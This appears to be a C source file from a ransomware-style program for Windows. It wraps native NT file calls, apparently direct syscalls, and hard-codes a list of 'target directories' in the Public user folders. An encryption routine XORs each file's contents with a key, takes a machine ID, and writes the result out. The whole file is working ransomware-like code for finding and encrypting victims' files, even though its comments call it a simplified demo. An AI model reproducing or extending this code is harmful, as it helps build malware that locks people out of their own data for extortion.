#include "file_ops.h"
#include <stdlib.h>
#include <string.h>

file_op_result_t file_open(const wchar_t* path, HANDLE* handle, uint32_t access, uint32_t disposition) {
    UNICODE_STRING file_name;
    OBJECT_ATTRIBUTES obj_attr;
    IO_STATUS_BLOCK io_status;
    
    init_unicode_string(&file_name, path);
    init_object_attributes(&obj_attr, &file_name, OBJ_CASE_INSENSITIVE);
    
    NTSTATUS status = sys_create_file(handle, access, &obj_attr, &io_status, 
                                     NULL, FILE_ATTRIBUTE_NORMAL, 0, disposition, 0, NULL, 0);
    
    return NT_SUCCESS(status) ? FILE_OP_SUCCESS : FILE_OP_ERROR_UNKNOWN;
}

file_op_result_t file_read(HANDLE handle, void* buffer, uint32_t size, uint32_t* bytes_read) {
    IO_STATUS_BLOCK io_status;
    NTSTATUS status = sys_read_file(handle, NULL, NULL, NULL, &io_status, buffer, size, NULL, NULL);
    
    if (bytes_read) *bytes_read = (uint32_t)io_status.Information;
    return NT_SUCCESS(status) ? FILE_OP_SUCCESS : FILE_OP_ERROR_UNKNOWN;
}

file_op_result_t file_write(HANDLE handle, const void* buffer, uint32_t size, uint32_t* bytes_written) {
    IO_STATUS_BLOCK io_status;
    NTSTATUS status = sys_write_file(handle, NULL, NULL, NULL, &io_status, (PVOID)buffer, size, NULL, NULL);
    
    if (bytes_written) *bytes_written = (uint32_t)io_status.Information;
    return NT_SUCCESS(status) ? FILE_OP_SUCCESS : FILE_OP_ERROR_UNKNOWN;
}

file_op_result_t file_close(HANDLE handle) {
    NTSTATUS status = sys_close_handle(handle);
    return NT_SUCCESS(status) ? FILE_OP_SUCCESS : FILE_OP_ERROR_UNKNOWN;
}

file_op_result_t get_target_directories(directory_list_t* dirs) {
    // Simplified - add user profile directories
    dirs->directories = malloc(sizeof(wchar_t*) * 6);
    dirs->count = 6;
    dirs->capacity = 6;
    
    dirs->directories[0] = L"C:\\Users\\Public\\Documents";
    dirs->directories[1] = L"C:\\Users\\Public\\Pictures";
    dirs->directories[2] = L"C:\\Users\\Public\\Desktop";
    dirs->directories[3] = L"C:\\Users\\Public\\Downloads";
    dirs->directories[4] = L"C:\\Users\\Public\\Music";
    dirs->directories[5] = L"C:\\Users\\Public\\Videos";
    
    return FILE_OP_SUCCESS;
}

file_op_result_t encrypt_file_syscall(const wchar_t* input_path, const wchar_t* output_path, 
                                     const uint8_t* key, const uint8_t* iv, const char* machine_id) {
    // Simplified file encryption
    HANDLE input_handle, output_handle;
    
    if (file_open(input_path, &input_handle, GENERIC_READ, OPEN_EXISTING) != FILE_OP_SUCCESS) {
        return FILE_OP_ERROR_NOT_FOUND;
    }
    
    if (file_open(output_path, &output_handle, GENERIC_WRITE, CREATE_ALWAYS) != FILE_OP_SUCCESS) {
        file_close(input_handle);
        return FILE_OP_ERROR_ACCESS_DENIED;
    }
    
    // Read, encrypt, and write file data
    uint8_t buffer[4096];
    uint32_t bytes_read, bytes_written;
    
    while (file_read(input_handle, buffer, sizeof(buffer), &bytes_read) == FILE_OP_SUCCESS && bytes_read > 0) {
        // Simple XOR encryption for demo
        for (uint32_t i = 0; i < bytes_read; i++) {
            buffer[i] ^= key[i % 32];
        }
        
        file_write(output_handle, buffer, bytes_read, &bytes_written);
    }
    
    file_close(input_handle);
    file_close(output_handle);
    
    return FILE_OP_SUCCESS;
}

void* file_alloc(size_t size) {
    return malloc(size);
}

void file_free(void* ptr) {
    free(ptr);
}